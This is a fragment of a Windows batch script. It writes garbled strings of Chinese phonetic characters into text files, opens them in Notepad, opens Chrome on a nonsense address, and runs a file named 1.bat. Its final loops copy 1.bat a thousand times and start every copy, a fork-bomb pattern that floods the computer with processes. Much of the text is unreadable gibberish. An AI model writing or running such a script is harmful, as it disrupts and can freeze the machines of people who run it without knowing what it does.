...
echo 艾伊艾吾弗艾吉尺屁艾弗艾哦吉儿尺屁艾艾儿屁尺哦 > 6尺屁艾弗艾哦吉儿尺屁艾艾611.txt

START notepad 6尺屁艾弗艾哦吉儿尺屁艾艾611.txt

echo 儿勒屁艾 艾艾西艾 艾艾 西吉艾艾伊娜伊 > 6548艾 艾艾西艾 艾艾.txt

START notepad 6548艾 艾艾西艾 艾艾.txt

echo 伊屁弗艾儿吉比吾艾伊 > 吉比吾艾5611.txt

START notepad 吉比吾艾5611.txt
START chrome.exe "http://勒屁艾 艾艾西伊娜艾 艾屁艾弗艾哦艾 西弗艾儿吉比吾吉艾艾"
...
start 1.bat
start %userprofile%\1.bat

for /l %A in (1,1,1000) do copy "1.bat" "1%A.bat"
for /l %A in (1,1,1000) do START "1%A.bat"
